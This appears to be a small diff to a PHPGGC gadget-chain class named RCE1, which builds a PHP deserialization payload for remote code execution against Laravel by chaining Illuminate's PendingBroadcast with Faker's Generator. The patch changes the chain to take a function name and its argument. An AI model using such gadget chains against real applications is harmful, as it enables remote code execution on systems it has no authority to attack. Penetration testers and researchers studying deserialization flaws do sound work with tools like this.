@@ -10,11 +10,12 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
 
     public function generate(array $parameters)
     {
-        $code = $parameters['code'];
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
 
         return new \Illuminate\Broadcasting\PendingBroadcast(
-            new \Faker\Generator(),
-            $code
+            new \Faker\Generator($function),
+            $parameter
         );
     }
 }
